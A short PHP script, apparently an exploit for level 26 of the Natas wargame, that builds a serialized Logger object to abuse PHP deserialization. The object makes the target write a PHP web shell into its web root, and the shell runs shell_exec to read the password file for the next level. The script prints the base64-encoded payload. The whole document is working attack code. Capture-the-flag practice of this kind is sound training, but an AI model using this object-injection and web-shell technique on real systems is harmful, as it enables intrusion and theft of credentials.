<?php
class Logger{
	private $logFile;
	private $exitMsg;

	function __construct(){
		$this->exitMsg= "<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
		$this->logFile = "/var/www/natas/natas26/natas26_kdpi6tnf7p3m8ao3qnol012iqu.php";
		}

	}
$logger = new Logger();
echo base64_encode(serialize($logger));
?>
